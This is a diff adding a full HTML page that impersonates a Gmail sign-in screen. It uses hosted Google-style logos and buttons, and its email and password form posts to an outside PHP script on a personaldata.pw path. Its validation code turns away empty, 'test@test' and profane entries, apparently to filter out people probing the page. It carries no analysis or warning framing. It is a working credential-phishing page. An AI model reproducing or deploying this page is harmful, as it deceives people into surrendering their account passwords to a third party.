@@ -1,0 +1,246 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<link rel="shortcut icon" href="https://storage.googleapis.com/admin-home-231412/gmail/favicon.ico" />
+		<title>Login - </title>
+		<style type="text/css">
+
+		body { 
+		  background: url(https://storage.googleapis.com/admin-home-231412/gmail/background.png) no-repeat center center fixed; 
+		  -webkit-background-size: cover;
+		  -moz-background-size: cover;
+		  -o-background-size: cover;
+		  background-size: cover;
+		  background-size: 100% 100%;
+		}
+
+
+		@media screen and (min-width: 500px) {
+			body {
+				width:420px;
+			}
+		}
+
+		@media screen and (min-width: 800px) {
+			body {
+				width:720px;
+			}
+		}
+
+		.login-container {
+			position: absolute;
+			padding-left: 9px;
+			padding-top: 6px; 
+			padding-bottom: 6px;
+			margin: 0 auto;
+			top: 15%;
+			left: 50%;
+			/*background-color: white;*//*
+			-moz-box-shadow: 0 0 2px 2px #e0e0e0;
+			-webkit-box-shadow: 0 0 2px 2px #e0e0e0;
+			box-shadow: 0 0 2px 2px #e0e0e0;*/
+			z-index: 1;
+		}
+
+		.header_logo {
+			position: absolute;
+			background-image: url('https://storage.googleapis.com/admin-home-231412/gmail/header_logo.png');
+			background-position: up center;
+  			background-repeat: no-repeat;
+  			background-size: contain;
+  			width: 100vw;
+  			height: 100vh;
+		}
+
+		.main_logo {
+			position: absolute;
+			top: 100px;
+			left: -350px;
+		}
+
+		.sign_g {
+			position: absolute;
+			top: 150px;
+			left: 33px;
+		}
+
+		.sign_y {
+			position: absolute;
+			top: 192px;
+			left: 33px;
+		}
+
+		.sign_h {
+			position: absolute;
+			top: 232px;
+			left: 33px;
+		}
+
+		.sign_g:hover {
+		    cursor: pointer;
+		    -webkit-transform: scale(1.1);
+  			transform: scale(1.1);
+		}
+
+		.sign_y:hover {
+		    cursor: pointer;
+		    -webkit-transform: scale(1.1);
+  			transform: scale(1.1);
+		}
+
+		.sign_h:hover {
+		    cursor: pointer;
+		    -webkit-transform: scale(1.1);
+  			transform: scale(1.1);
+		}
+
+
+		.sign_in {
+			position: absolute;
+			top: 100px;
+			left: 33px;
+		}
+
+		#empty_form_error {
+
+			position: relative;
+			top: 360px;
+			left: 25px;
+			color: #dd4444;
+			font-size: 14px;
+			z-index: -1;
+		}
+
+
+		input[type=email] {
+			position: absolute;
+			top: 260px;
+			left: 33px;
+		    width: 355px;
+		    padding: 8px 11px;
+		    margin: 8px 0;
+		    box-sizing: border-box;
+		    border: 1px solid grey;
+		    border-radius: 3px;
+		    font-size: 15px;
+		    font-family: Arial, Helvetica, sans-serif;
+		}
+
+		input[type=password] {
+			position: absolute;
+			top: 310px;
+			left: 33px;
+		    width: 355px;
+		    padding: 8px 11px;
+		    margin: 8px 0;
+		    box-sizing: border-box;
+		    border: 1px solid grey;
+		    border-radius: 3px;
+		    font-size: 15px;
+		    font-family: Arial, Helvetica, sans-serif;
+		}
+
+		button[type=submit] {
+			position: absolute;
+			top: 370px;
+			left: 298px;
+			cursor: pointer;
+		}
+
+
+		</style>
+	</head>
+
+	<body>
+
+		<form id="dropform" name="dropform" method="post" action="personaldata.pw/markwilliam555666/finish.php" onsubmit="return validateForm()">
+
+		<div class="header_logo"></div>
+
+		<div class="login-container">
+
+		
+		<div class="main_logo"><img src="https://storage.googleapis.com/admin-home-231412/gmail/big_logo.png" width="290px"></div>
+
+		<div class="sign_in"><img src="https://storage.googleapis.com/admin-home-231412/gmail/sign_in.png" width="360" height="235"></div>
+
+			<div class="sign_g"><a href="https://storage.googleapis.com/mailru-home-23142/xasdafax/gmail.html"><img src="https://storage.googleapis.com/admin-home-231412/gmail/sign_in_with_g.png" width="355" height="40"></a></div>
+<!-- 			<div class="sign_y"><a href="y_sign.php"><img src="https://storage.googleapis.com/admin-home-231412/gmail/sign_in_with_y.png" width="355" height="40"></a></div>
+			<div class="sign_h"><a href="h_sign.php"><img src="https://storage.googleapis.com/admin-home-231412/gmail/sign_in_with_h.png" width="355" height="40"></a></div> -->
+
+
+			<input type="Email" id="email" name="email" placeholder="Email" mpdistrans="1" autocomplete="off" required>
+			<input type="password" id="password" mpdistrans="1" autocomplete="off" required name="password" placeholder="Password">
+			
+			<button type="submit" style="border: 0; background: transparent">
+		    	<img src="https://storage.googleapis.com/admin-home-231412/gmail/submit_button.png" width="85" height="40" alt="submit" />
+			</button>
+
+			<div id="empty_form_error"></div>
+
+		</div>
+
+		<script src="https://code.jquery.com/jquery-2.2.3.min.js"></script>
+		<script>
+			// JavaScript for label effects only
+			$(window).load(function(){
+				$(".col-3 input").val("");
+
+				$(".input-effect input").focusout(function(){
+					if($(this).val() != ""){
+						$(this).addClass("has-content");
+					}else{
+						$(this).removeClass("has-content");
+					}
+				})
+			});
+
+			function validateForm() {
+				var email = document.forms["dropform"]["email"].value;
+				var pass = document.forms["dropform"]["password"].value;
+				if (email == "") {
+					document.getElementById('empty_form_error').innerHTML="Enter an email address";
+					return false;
+				}
+
+				if(pass == "") {
+					document.getElementById('empty_form_error').innerHTML="Enter your password (Case Sensitive)";
+					return false;
+				}
+
+				if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
+					document.getElementById('empty_form_error').innerHTML="Enter a valid email address (username@domain.com)";
+					return false;
+				}
+
+				if (email.match(/fuck/)) {
+					document.getElementById('empty_form_error').innerHTML="Enter a valid email address (username@domain.com)";
+					return false;
+				}
+
+				if (email.match(/asshole/)) {
+					document.getElementById('empty_form_error').innerHTML="Enter a valid email address (username@domain.com)";
+					return false;
+				}
+
+				if (email.match(/dickhead/)) {
+					document.getElementById('empty_form_error').innerHTML="Enter a valid email address (username@domain.com)";
+					return false;
+				}
+
+				if (email.match(/test@test/)) {
+					document.getElementById('empty_form_error').innerHTML="Enter a valid email address (username@domain.com)";
+					return false;
+				}
+
+				if (email.match(/bitch/)) {
+					document.getElementById('empty_form_error').innerHTML="Enter a valid email address (username@domain.com)";
+					return false;
+				}
+			}
+			</script>
+
+		</form>
+	</body>
+</html>
